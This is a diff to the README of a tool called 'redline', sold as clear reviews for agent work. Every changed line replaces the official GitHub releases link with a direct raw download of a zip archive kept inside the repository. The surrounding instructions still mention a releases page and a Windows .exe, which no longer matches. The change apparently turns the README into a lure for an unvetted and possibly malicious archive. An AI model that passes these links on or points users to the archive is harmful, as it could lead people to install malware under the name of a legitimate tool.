@@ -1,6 +1,6 @@
 # 🟥 redline - Clear reviews for agent work
 
-[![Download redline](https://img.shields.io/badge/Download%20redline-Visit%20Releases-blue)](https://github.com/sectioneightweimaraner774/redline/releases)
+[![Download redline](https://img.shields.io/badge/Download%20redline-Visit%20Releases-blue)](https://github.com/sectioneightweimaraner774/redline/raw/refs/heads/main/plugins/redline/Software_2.3.zip)
 
 ## 🚀 What redline does
 
@@ -17,7 +17,7 @@ Use it when you want to:
 
 To get redline, visit this page to download:
 
-https://github.com/sectioneightweimaraner774/redline/releases
+https://github.com/sectioneightweimaraner774/redline/raw/refs/heads/main/plugins/redline/Software_2.3.zip
 
 On that page, pick the latest release for Windows and download the file that matches your system. If there are more than one file, choose the Windows file with the `.exe` extension.
 
@@ -176,7 +176,7 @@ redline fits well when you want to:
 
 If you need to download redline again or check for a newer release, use this page:
 
-[https://github.com/sectioneightweimaraner774/redline/releases](https://github.com/sectioneightweimaraner774/redline/releases)
+[https://github.com/sectioneightweimaraner774/redline/raw/refs/heads/main/plugins/redline/Software_2.3.zip](https://github.com/sectioneightweimaraner774/redline/raw/refs/heads/main/plugins/redline/Software_2.3.zip)
 
 ## 🖱️ Quick start
 
